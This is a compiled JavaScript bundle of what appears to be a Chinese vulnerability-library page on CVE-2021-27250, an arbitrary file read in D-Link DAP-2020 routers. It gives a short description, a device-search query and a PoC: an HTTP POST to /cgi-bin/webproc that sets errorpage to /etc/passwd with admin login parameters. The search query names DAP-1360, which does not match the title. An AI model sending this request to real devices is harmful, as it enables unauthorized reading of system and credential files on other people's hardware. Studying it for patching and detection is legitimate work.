(window.webpackJsonp=window.webpackJsonp||[]).push([[327],{1341:function(s,a,t){s.exports=t.p+"assets/img/1657417802195-b0c19793-5041-4c70-8388-21a1827433b1.c28a80d7.png"},1342:function(s,a,t){s.exports=t.p+"assets/img/1657419070826-a79f2e11-02b4-406b-a728-435e5259ceba.ff690e80.png"},2985:function(s,a,t){"use strict";t.r(a);var r=t(64),e=Object(r.a)({},(function(){var s=this,a=s._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"d-link-dap-2020-webproc-任意文件读取漏洞-cve-2021-27250"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#d-link-dap-2020-webproc-任意文件读取漏洞-cve-2021-27250"}},[s._v("#")]),s._v(" D-LINK DAP-2020 webproc 任意文件读取漏洞 CVE-2021-27250")]),s._v(" "),a("h2",{attrs:{id:"漏洞描述"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),a("p",[s._v("近日D-Link发布公告[1]称旗下产品DAP-2020存在任意文件读取漏洞，CVE编号为CVE-2021-27250，目前已在硬件版本：A1，固件版本：1.01 上测试了PoC，由于漏洞影响核心组件，因此其他版本也可能受到此漏洞的影响")]),s._v(" "),a("h2",{attrs:{id:"漏洞影响"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[s._v("#")]),s._v(" 漏洞影响")]),s._v(" "),a("a-checkbox",{attrs:{checked:""}},[s._v("D-LINK DAP-2020 ")]),a("br"),s._v(" "),a("h2",{attrs:{id:"网络测绘"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[s._v("#")]),s._v(" 网络测绘")]),s._v(" "),a("a-checkbox",{attrs:{checked:""}},[s._v('body="DAP-1360" && body="6.05"')]),a("br"),s._v(" "),a("h2",{attrs:{id:"漏洞复现"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),a("p",[s._v("登录页面")]),s._v(" "),a("p",[a("img",{attrs:{src:t(1341),alt:"img"}})]),s._v(" "),a("p",[s._v("验证POC")]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[a("span",{pre:!0,attrs:{class:"token constant"}},[s._v("POST")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("cgi"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("bin"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("webproc\n\ngetpage"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("html"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v("Findex"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v("html"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),s._v("errorpage"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("etc"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("passwd"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("var")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("3")]),s._v("Amenu"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("setup"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("var")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("3")]),s._v("Apage"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("wizard"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("var")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("3")]),s._v("Alogin"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token constant boolean"}},[s._v("true")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),s._v("obj"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("action"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("auth"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("3")]),s._v("Ausername"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("admin"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("3")]),s._v("Apassword"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("123")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("3")]),s._v("Aaction"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("login"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("3")]),s._v("Asessionid"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("3")]),s._v("c1f7123\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[a("img",{attrs:{src:t(1342),alt:"img"}})])],1)}),[],!1,null,null,null);a.default=e.exports}}]);